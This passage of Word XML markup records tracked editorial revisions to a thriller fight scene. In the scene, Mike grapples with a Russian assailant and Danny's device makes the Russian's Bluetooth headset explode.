        <w:r w:rsidRPr="000D3488" w:rsidDel="00585497">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">downward blow </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">with an overhead block, the lug wrench </w:t>
      </w:r>
      <w:ins w:id="1276" w:author="TextVet" w:date="2016-03-18T14:28:00Z">
        <w:r w:rsidR="00A163C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ba</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1277" w:author="TextVet" w:date="2016-03-18T14:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A163C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>hi</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:ins w:id="1278" w:author="TextVet" w:date="2016-03-18T14:28:00Z">
        <w:r w:rsidR="00A163C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>er</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing his forearm</w:t>
      </w:r>
      <w:ins w:id="1279" w:author="TextVet" w:date="2016-03-18T14:29:00Z">
        <w:r w:rsidR="00EE78BA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> instead</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1280" w:author="TextVet" w:date="2016-03-18T14:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE78BA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> rather than his skull</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He fluidly parlayed the block into a side kick; his rearward leg struck upward in a powerful snap against the bottom of Mike’s ribcage. Mike grunted</w:t>
      </w:r>
      <w:ins w:id="1281" w:author="TextVet" w:date="2016-03-18T14:31:00Z">
        <w:r w:rsidR="004E28BD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1282" w:author="TextVet" w:date="2016-03-18T14:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E28BD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in pain and curled</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his torso </w:t>
      </w:r>
      <w:ins w:id="1283" w:author="TextVet" w:date="2016-03-18T14:31:00Z">
        <w:r w:rsidR="004E28BD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">curling </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">down around the point of impact, </w:t>
      </w:r>
      <w:del w:id="1284" w:author="TextVet" w:date="2016-03-18T14:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E28BD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">clutching </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">his arms </w:t>
      </w:r>
      <w:ins w:id="1285" w:author="TextVet" w:date="2016-03-18T14:32:00Z">
        <w:r w:rsidR="004E28BD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>fortressing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1286" w:author="TextVet" w:date="2016-03-18T14:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E28BD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>defensively</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> near his chest. As the Russian brought his leg down from the kick, he stomped his heel squarely </w:t>
      </w:r>
      <w:del w:id="1287" w:author="TextVet" w:date="2016-03-18T14:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AA6956">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">down </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>onto Mike’s foot. Mike staggered backward.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Russian shifted his weight to deliver another kick. Mike saw him and </w:t>
      </w:r>
      <w:commentRangeStart w:id="1288"/>
      <w:ins w:id="1289" w:author="TextVet" w:date="2016-03-18T14:34:00Z">
        <w:r w:rsidR="00DA7B6F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>lightninged</w:t>
        </w:r>
        <w:commentRangeEnd w:id="1288"/>
        <w:r w:rsidR="00B87CE8">
          <w:rPr>
            <w:rStyle w:val="CommentReference"/>
          </w:rPr>
          <w:commentReference w:id="1288"/>
        </w:r>
      </w:ins>
      <w:del w:id="1290" w:author="TextVet" w:date="2016-03-18T14:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DA7B6F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>quickly took</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> another step back to avoid the attack. H</w:t>
      </w:r>
      <w:del w:id="1291" w:author="TextVet" w:date="2016-03-18T14:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007C7407">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>e found himself with h</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">is back </w:t>
      </w:r>
      <w:ins w:id="1292" w:author="TextVet" w:date="2016-03-18T14:35:00Z">
        <w:r w:rsidR="007C7407">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>pressed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1293" w:author="TextVet" w:date="2016-03-18T14:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="007C7407">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a wall</w:t>
      </w:r>
      <w:ins w:id="1294" w:author="TextVet" w:date="2016-03-18T14:35:00Z">
        <w:r w:rsidR="007C7407">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> and dulled a caution to him</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Russian’s planned second kick was a feint. Mike, still protecting his aching rib, was unwittingly leaving his face open.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delivery of the side kick had brought the Russian’s hand down near his hip. From there, with a turn of his waist and a cough-like shout, he lunged forward and fired his fist up and center. The strike drove straight into Mike’s nose.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Mike’s head flew back and slammed into the wall behind him, with enough force to knock a hole in the drywall. Flakes of gypsum flew from the point of impact. Dust lodged in Mike’s hair.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paused for a moment to read his opponent.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withdrew his head from the drywall, revealing a crater. He swayed sideways and stood uneasily.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Danny shouted.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pulled himself up to his full height and looked down at the Russian with a completely uncomprehending face</w:t>
      </w:r>
      <w:ins w:id="1295" w:author="TextVet" w:date="2016-03-18T14:38:00Z">
        <w:r w:rsidR="00F97048">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1296" w:author="TextVet" w:date="2016-03-18T14:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F97048">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297" w:author="TextVet" w:date="2016-03-18T14:38:00Z">
        <w:r w:rsidR="00F97048">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1298" w:author="TextVet" w:date="2016-03-18T14:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F97048">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">is eyes </w:t>
      </w:r>
      <w:del w:id="1299" w:author="TextVet" w:date="2016-03-18T14:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F97048">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">were </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>glazed</w:t>
      </w:r>
      <w:ins w:id="1300" w:author="TextVet" w:date="2016-03-18T14:37:00Z">
        <w:r w:rsidR="00447FD3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1301" w:author="TextVet" w:date="2016-03-18T14:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00447FD3">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empty.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00073E46" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1302" w:author="TextVet" w:date="2016-03-18T14:40:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Wound</w:t>
        </w:r>
        <w:r w:rsidR="006D268B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">-benumbed, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Mike </w:t>
      </w:r>
      <w:del w:id="1303" w:author="TextVet" w:date="2016-03-18T14:39:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="004348FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">absentmindedly </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1304" w:author="TextVet" w:date="2016-03-18T14:39:00Z">
        <w:r w:rsidR="004348FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>dropped</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1305" w:author="TextVet" w:date="2016-03-18T14:39:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="004348FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>let go of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the wrench</w:t>
      </w:r>
      <w:ins w:id="1306" w:author="TextVet" w:date="2016-03-18T14:39:00Z">
        <w:r w:rsidR="004348FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1307" w:author="TextVet" w:date="2016-03-18T14:39:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="004348FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">. It dropped </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to the floor. He took a step toward the Russian and began an uncontrolled lurch forward.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Russian </w:t>
      </w:r>
      <w:ins w:id="1308" w:author="TextVet" w:date="2016-03-18T14:41:00Z">
        <w:r w:rsidR="00D766C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>seized</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1309" w:author="TextVet" w:date="2016-03-18T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D766C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>took advantage of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Mike’s momentum</w:t>
      </w:r>
      <w:ins w:id="1310" w:author="TextVet" w:date="2016-03-18T14:41:00Z">
        <w:r w:rsidR="00D766C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1311" w:author="TextVet" w:date="2016-03-18T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D766C9">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del w:id="1312" w:author="TextVet" w:date="2016-03-18T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D766C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">He </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>reach</w:t>
      </w:r>
      <w:ins w:id="1313" w:author="TextVet" w:date="2016-03-18T14:41:00Z">
        <w:r w:rsidR="00D766C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1314" w:author="TextVet" w:date="2016-03-18T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D766C9">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up with both hands, </w:t>
      </w:r>
      <w:ins w:id="1315" w:author="TextVet" w:date="2016-03-18T14:41:00Z">
        <w:r w:rsidR="00D766C9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">he </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>grabbed Mike’s head, and prepared to pull down. He drew up his leg, ready to drive his knee into Mike’s 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His Bluetooth headset exploded.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B9126E" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="1316" w:author="TextVet" w:date="2016-03-18T14:47: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Tina’s wide-eyed gaze turned from the combatants to Danny. Too weak to join the melee, Danny had aimed his machine at the men. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00B9126E" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1317" w:author="TextVet" w:date="2016-03-18T14:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1318" w:author="TextVet" w:date="2016-03-18T14:44:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he soft “bonk!” and a change in some of its lights</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1319" w:author="TextVet" w:date="2016-03-18T14:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">’ colors on his </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1320" w:author="TextVet" w:date="2016-03-18T14:45:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Nothing seemed to happen when he had </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pull</w:t>
      </w:r>
      <w:ins w:id="1321" w:author="TextVet" w:date="2016-03-18T14:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1322" w:author="TextVet" w:date="2016-03-18T14:45:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00B9126E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
